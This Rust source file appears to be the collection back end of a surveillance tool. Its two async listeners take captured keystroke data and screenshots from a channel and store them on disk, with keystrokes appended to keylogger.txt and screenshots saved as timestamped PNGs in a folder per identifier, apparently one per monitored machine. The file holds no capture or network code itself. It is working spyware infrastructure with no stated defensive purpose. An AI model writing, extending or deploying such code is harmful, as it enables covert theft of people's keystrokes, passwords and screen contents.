use chrono::{Datelike, Timelike, Utc};
use tokio::{fs::{self, create_dir, File}, io::AsyncWriteExt, sync::mpsc::Receiver};

pub async fn keylog_listener(mut rx: Receiver<Vec<u8>>, identifier: &str) -> std::io::Result<()>{
    let directory = format!("{}/", identifier);
    if !fs::try_exists(&directory).await? {
        create_dir(&directory).await?;
    }
    let file_path = format!("{}keylogger.txt", directory);
    let mut file = File::options().append(true).create(true).open(file_path).await?;
    while let Some(data) = rx.recv().await {
        file.write_all(&data).await?;
        file.flush().await?;
    }
    file.shutdown().await?;
    Ok(())
}

pub async fn screenshot_listener(mut rx: Receiver<Vec<u8>>, identifier: &str) -> std::io::Result<()> {
    let directory = format!("{}/", identifier);
    if !fs::try_exists(&directory).await? {
        create_dir(&directory).await?;
    }
    while let Some(data) = rx.recv().await {
        let time = Utc::now();
        let file_path = format!("{}screenshot-{}-{}-{}T{}-{}-{}.png",
        directory,
        time.year(),
        time.month(),
        time.day(),
        time.hour(),
        time.minute(),
        time.second());
        let mut file = File::options().write(true).create(true).open(file_path).await?;
        file.write_all(&data).await?;
        file.flush().await?;
        file.shutdown().await?;
    }


    Ok(())
}
